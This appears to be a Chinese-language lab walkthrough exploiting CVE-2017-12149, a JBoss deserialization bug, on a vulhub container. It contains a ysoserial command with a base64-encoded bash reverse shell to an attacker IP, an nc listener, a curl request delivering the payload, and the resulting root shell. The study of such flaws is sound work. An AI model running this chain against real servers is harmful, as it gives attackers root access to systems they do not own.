# CVE-2017-12149

漏洞环境搭建，下在vulhub，cd到对应的目录执行以下命令

{% embed url="https://github.com/vulhub/vulhub" %}

```
docker-compose up -d
```

好了访问目标8080端口

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

访问/invoker/readonly这个路径相应500，说明存在漏洞

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

漏洞利用环境准备，下载ysoserial用来生成利用链

{% embed url="https://github.com/frohoff/ysoserial.git" %}

执行以下命令生产POC

```
┌──(root㉿kali)-[~/Desktop/tool/jdk1.8.0_202/bin]
└─# ./java -jar ../../Deserialization/ysoserial/target/ysoserial-all.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzLjEyOS85OTkyIDA+JjE=}|{base64,-d}|{bash,-i}" > /root/Desktop/test/poc.ser
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

nc开启监听

```
nc -lnvp 9992
```

通过burp发送poc没有没有返回shell

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

通过curl发送该poc

```
┌──(root㉿kali)-[~/Desktop/test]
└─# curl http://192.168.23.132:8080/invoker/readonly --data-binary @poc.ser
```

监听端口返回一个shell

```
┌──(root㉿kali)-[~]
└─# nc -nlvp 9992
listening on [any] 9992 ...
connect to [192.168.23.129] from (UNKNOWN) [192.168.23.132] 42670
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@81b0d810cbbf:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```
